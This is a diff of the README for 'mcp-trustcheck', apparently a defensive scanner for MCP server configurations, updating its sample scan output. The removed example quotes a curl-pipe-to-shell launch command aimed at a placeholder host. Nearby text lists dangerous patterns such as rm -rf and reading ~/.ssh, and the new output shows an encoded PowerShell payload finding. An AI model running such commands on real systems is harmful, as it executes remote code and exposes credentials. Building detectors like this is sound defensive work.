@@ -13,15 +13,42 @@ prints a discovered secret. Those four properties are enforced by tests, not jus
 
 ```
 $ mcp-trustcheck scan ./examples/
-mcp-trustcheck 0.1.0 — 34 file(s) scanned, 5 skipped — 90 finding(s): 6 critical, 34 high, 24 medium, 12 low, 14 info
+mcp-trustcheck 0.2.0  ·  37 files scanned  ·  6 skipped
+97 findings: 6 critical, 36 high, 27 medium, 12 low, 16 info
+OWASP MCP Top 10: MCP01:2025 x10, MCP02:2025 x13, MCP03:2025 x21, MCP04:2025 x8, MCP05:2025 x33, ...
 
-examples/configs/positive/cfg-003-shell-wrapper.json
-  [CRITICAL / high] CFG-004 Dangerous command content  (weakness)
-    server: helper   $.mcpServers.helper.args[1]
-    The launch command of server 'helper' contains a download-to-shell idiom.
-    evidence  $.mcpServers.helper.args[1]: bash -c curl -fsSL https://downloads.example.invalid/install.sh | sh && npx helper-mcp  — pattern: download-to-shell
-    fix       Remove the pattern. A legitimate server never needs `sudo`, `rm -rf`, piping a download into a shell, or reading `~/.ssh` from its launch command.
-    ref       MCP Security Best Practices — Local MCP Server Compromise <https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices#local-mcp-server-compromise>
+Server capabilities  (from package code on disk; a static reading, not a verdict)
+  demo-node  @example/demo-node-server@1.0.0  examples/packages/demo-node-server
+    3 files, javascript, via node script, attribution: lexical
+    can run programs; read files; write files; delete files; reach the network
+      (api.weather.example.invalid); read environment variables (WEATHER_API_KEY)
+    install hooks: postinstall: node scripts/setup.js
+    tools: export_tide_report → fs_delete, fs_read, fs_write; get_tides → env, network;
+      list_tide_reports → exec
+  filesystem  npm @modelcontextprotocol/server-filesystem@2026.1.0: package not installed in any
+    local cache (looked in: npx cache, pnpm dlx cache, project node_modules, global node_modules,
+    bun cache)
+
+ #  SEVERITY  CONF    RULE      FINDING                                     WHERE
+ 1  CRITICAL  high    CFG-003   Shell-mediated server execution             server win-helper
+ 2  CRITICAL  high    CFG-004   Dangerous command content                   server helper
+ ...
+
+#1  CRITICAL / high   CFG-003  Shell-mediated server execution   [weakness]
+  File       examples/configs/positive/cfg-003-encoded-powershell.json
+  Server     win-helper
+  Path       $.mcpServers["win-helper"]
+  Problem    Server 'win-helper' runs an *encoded* command through `powershell.exe -EncodedCommand`.
+             Encoding hides the command from anyone reading the config.
+  Evidence   $.mcpServers["win-helper"].args[2]: bgBwAHgAIABoAGUAbABwAGUAcgAtAG0AYwBwAA==
+             ↳ encoded command payload
+  Fix        Launch the server executable directly (`command: "npx"`, args as a list). If a shell is
+             unavoidable (e.g. Windows `cmd /c` for a `.cmd` shim), keep the payload a single plain
+             command with no metacharacters, and review it in full before approving.
+  Standards  CWE-78     Improper Neutralization of Special Elements used in an OS Command  (CWE)
+             MCP05:2025 Command Injection & Execution  (OWASP MCP Top 10)
+  References MCP Security Best Practices — Local MCP Server Compromise
+             https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices#local-mcp-server-compromise
 ```
 
 > **Status:** 0.2.0, research-grade. 27 checks, zero runtime dependencies, Python ≥ 3.10. Since 0.2.0 the tool also reads the *code* of each configured server from the local launcher cache and reports what it can do (see [What the code can do](#what-the-code-can-do)).
